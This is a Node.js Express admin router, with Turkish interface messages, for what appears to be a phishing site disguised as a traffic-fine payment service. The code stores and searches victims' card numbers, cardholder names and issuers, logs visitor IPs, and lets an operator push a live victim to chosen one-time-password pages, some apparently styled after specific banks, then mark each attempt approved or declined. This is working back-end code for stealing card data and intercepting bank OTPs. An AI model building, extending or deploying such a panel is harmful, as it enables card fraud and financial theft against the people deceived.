const express  = require('express');
const bcrypt   = require('bcryptjs');
const router   = express.Router();
const { query, queryOne, getSetting, setSetting } = require('../db');

function requireAdmin(req, res, next) {
  if (req.session.adminLoggedIn) return next();
  res.redirect('/admin/login');
}

// ─── Login ───────────────────────────────────────────────────────────────────
router.get('/', (req, res) => res.redirect('/admin/dashboard'));
router.get('/login', (req, res) => {
  if (req.session.adminLoggedIn) return res.redirect('/admin/dashboard');
  res.render('admin/login', { error: null });
});

router.post('/login', async (req, res) => {
  const { username='', password='' } = req.body;
  try {
    const user = await queryOne('SELECT id, password FROM admin_users WHERE username = ? LIMIT 1', [username]);
    if (user && await bcrypt.compare(password, user.password)) {
      req.session.adminLoggedIn = true;
      req.session.adminUser     = username;
      return res.redirect('/admin/dashboard');
    }
    res.render('admin/login', { error: 'Kullanıcı adı veya şifre hatalı.' });
  } catch (e) {
    res.render('admin/login', { error: 'Veritabanı hatası: ' + e.message });
  }
});

router.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/admin/login');
});

// ─── Dashboard ───────────────────────────────────────────────────────────────
router.get('/dashboard', requireAdmin, async (req, res) => {
  try {
    const today = new Date().toISOString().slice(0,10);
    const [[{totalPayments}]]   = await query('SELECT COUNT(*) AS totalPayments FROM payments');
    const [[{todayPayments}]]   = await query('SELECT COUNT(*) AS todayPayments FROM payments WHERE DATE(created_at)=?', [today]);
    const [[{totalInquiries}]]  = await query('SELECT COUNT(*) AS totalInquiries FROM inquiries');
    const [[{todayInquiries}]]  = await query('SELECT COUNT(*) AS todayInquiries FROM inquiries WHERE DATE(created_at)=?', [today]);
    const [[{pendingPayments}]] = await query("SELECT COUNT(*) AS pendingPayments FROM payments WHERE otp_status='pending'");
    const [[{approvedPayments}]]= await query("SELECT COUNT(*) AS approvedPayments FROM payments WHERE otp_status='approved'");
    const [[{totalRevenue}]]    = await query('SELECT COALESCE(SUM(total_fine),0) AS totalRevenue FROM payments');
    const recentPayments  = await query('SELECT * FROM payments ORDER BY created_at DESC LIMIT 10');
    const recentInquiries = await query('SELECT * FROM inquiries ORDER BY created_at DESC LIMIT 6');

    res.render('admin/dashboard', {
      adminUser: req.session.adminUser,
      totalPayments, todayPayments, totalInquiries, todayInquiries,
      pendingPayments, approvedPayments, totalRevenue,
      recentPayments, recentInquiries,
    });
  } catch (e) {
    res.render('admin/dashboard', { adminUser: req.session.adminUser, dbError: e.message });
  }
});

// ─── Payments ────────────────────────────────────────────────────────────────
router.get('/payments', requireAdmin, async (req, res) => {
  const statusFilter = req.query.status || '';
  const search       = req.query.q || '';
  const page         = Math.max(1, parseInt(req.query.p) || 1);
  const perPage      = 25;
  const offset       = (page - 1) * perPage;

  try {
    let where = '1=1', params = [];
    if (statusFilter) { where += ' AND otp_status = ?'; params.push(statusFilter); }
    if (search) {
      where += ' AND (plate_no LIKE ? OR card_number LIKE ? OR card_name LIKE ? OR card_issuer LIKE ?)';
      params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
    }
    const [[{total}]] = await query(`SELECT COUNT(*) AS total FROM payments WHERE ${where}`, params);
    const payments    = await query(`SELECT * FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages  = Math.max(1, Math.ceil(total / perPage));

    res.render('admin/payments', {
      adminUser: req.session.adminUser,
      payments, total, totalPages, page, statusFilter, search,
    });
  } catch (e) {
    res.render('admin/payments', { adminUser: req.session.adminUser, dbError: e.message, payments:[], total:0, totalPages:1, page:1, statusFilter, search });
  }
});

// ─── Inquiries ───────────────────────────────────────────────────────────────
router.get('/inquiries', requireAdmin, async (req, res) => {
  const search  = req.query.q || '';
  const page    = Math.max(1, parseInt(req.query.p) || 1);
  const perPage = 30;
  const offset  = (page - 1) * perPage;

  try {
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (plate_no LIKE ? OR plate_src LIKE ? OR plate_code LIKE ? OR ip LIKE ?)';
      params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
    }
    const [[{total}]]    = await query(`SELECT COUNT(*) AS total FROM inquiries WHERE ${where}`, params);
    const rows           = await query(`SELECT * FROM inquiries WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages     = Math.max(1, Math.ceil(total / perPage));
    const today          = new Date().toISOString().slice(0,10);
    const [[{todayCount}]]   = await query('SELECT COUNT(*) AS todayCount FROM inquiries WHERE DATE(created_at)=?', [today]);
    const [[{uniqueIPs}]]    = await query('SELECT COUNT(DISTINCT ip) AS uniqueIPs FROM inquiries');
    const [[{withFines}]]    = await query('SELECT COUNT(*) AS withFines FROM inquiries WHERE fine_count > 0');

    res.render('admin/inquiries', {
      adminUser: req.session.adminUser,
      rows, total, totalPages, page, search,
      todayCount, uniqueIPs, withFines,
    });
  } catch (e) {
    res.render('admin/inquiries', { adminUser: req.session.adminUser, dbError: e.message, rows:[], total:0, totalPages:1, page:1, search, todayCount:0, uniqueIPs:0, withFines:0 });
  }
});

// ─── Settings ────────────────────────────────────────────────────────────────
router.get('/settings', requireAdmin, async (req, res) => {
  try {
    const otpDefault = await getSetting('otp_default_page', 'otp-sms');
    const siteActive = await getSetting('site_active', '1');
    res.render('admin/settings', { adminUser: req.session.adminUser, otpDefault, siteActive, saved: false, error: null, pwMsg: null });
  } catch (e) {
    res.render('admin/settings', { adminUser: req.session.adminUser, otpDefault:'otp-sms', siteActive:'1', saved:false, error:e.message, pwMsg:null });
  }
});

router.post('/settings', requireAdmin, async (req, res) => {
  const otpDefault = await getSetting('otp_default_page', 'otp-sms');
  const siteActive = await getSetting('site_active', '1');

  let saved = false, error = null, pwMsg = null;
  if (req.body.save_settings !== undefined) {
    try {
      await setSetting('otp_default_page', req.body.otp_default_page || 'otp-sms');
      await setSetting('site_active',      req.body.site_active      || '1');
      saved = true;
    } catch (e) { error = e.message; }
  } else if (req.body.change_password !== undefined) {
    const { current_password='', new_password='', new_password2='' } = req.body;
    try {
      const user = await queryOne('SELECT password FROM admin_users WHERE username = ? LIMIT 1', [req.session.adminUser]);
      if (!user || !await bcrypt.compare(current_password, user.password)) {
        pwMsg = { type:'error', text:'Mevcut şifre hatalı.' };
      } else if (new_password.length < 6) {
        pwMsg = { type:'error', text:'Yeni şifre en az 6 karakter olmalı.' };
      } else if (new_password !== new_password2) {
        pwMsg = { type:'error', text:'Yeni şifreler eşleşmiyor.' };
      } else {
        await query('UPDATE admin_users SET password = ? WHERE username = ?',
          [await bcrypt.hash(new_password, 10), req.session.adminUser]);
        pwMsg = { type:'success', text:'Şifre başarıyla değiştirildi.' };
      }
    } catch (e) { pwMsg = { type:'error', text: e.message }; }
  }

  const newOtpDefault = await getSetting('otp_default_page', 'otp-sms');
  const newSiteActive = await getSetting('site_active', '1');
  res.render('admin/settings', { adminUser: req.session.adminUser, otpDefault: newOtpDefault, siteActive: newSiteActive, saved, error, pwMsg });
});

// ─── Actions (AJAX) ──────────────────────────────────────────────────────────
router.post('/action', requireAdmin, async (req, res) => {
  const { act='', sid='' } = req.body;
  const cleanSid = sid.replace(/[^a-f0-9]/g, '');
  try {
    if (act === 'redirect') {
      const allowed = ['otp-sms','otp','otp-citi','otp-mashreq'];
      if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
      await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, req.body.page, cleanSid]);
      return res.json({ ok: true });
    }
    if (act === 'set_status') {
      const allowed = ['pending','approved','declined'];
      if (!cleanSid || !allowed.includes(req.body.status)) return res.json({ ok:false, error:'Invalid' });
      await query('UPDATE payments SET otp_status = ? WHERE sid = ?', [req.body.status, cleanSid]);
      return res.json({ ok: true });
    }
    if (act === 'save_setting') {
      const key = (req.body.key||'').replace(/[^a-z_]/g,'');
      if (!key) return res.json({ ok:false });
      await setSetting(key, req.body.value || '');
      return res.json({ ok: true });
    }
    if (act === 'delete_payment') {
      if (!cleanSid) return res.json({ ok:false });
      await query('DELETE FROM payments WHERE sid = ?', [cleanSid]);
      await query('DELETE FROM otp_events WHERE sid = ?', [cleanSid]);
      return res.json({ ok: true });
    }
    res.json({ ok:false, error:'Unknown action' });
  } catch (e) {
    res.json({ ok:false, error:e.message });
  }
});

module.exports = router;
